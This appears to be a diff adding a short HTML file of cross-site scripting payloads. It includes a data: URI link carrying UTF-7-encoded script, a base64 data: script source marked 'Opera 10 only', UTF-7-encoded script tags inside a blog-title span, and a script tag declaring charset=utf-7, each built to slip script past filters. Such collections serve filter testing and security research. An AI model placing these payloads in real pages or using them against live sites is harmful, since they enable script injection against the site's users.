@@ -1,0 +1,10 @@
+<a href="data:text/html;charset=utf-7,+ADwAcwBjAHIAaQBwAHQAPg+-alert(1);history.back()+ADs-</script>">UTF-16 in BASE64/UTF-7/UTF-8 mixture</a>
+
+
+<script/ src=data:;base64,---\?--YWxlcnQoMSkNCg/> //Opera 10 only
+
+<span class="blog_title">
++ADw-script+AD4-alert("Hi mom!")+ADw-/script+AD4-
+</span>
+
+<script src=... charset=utf-7>
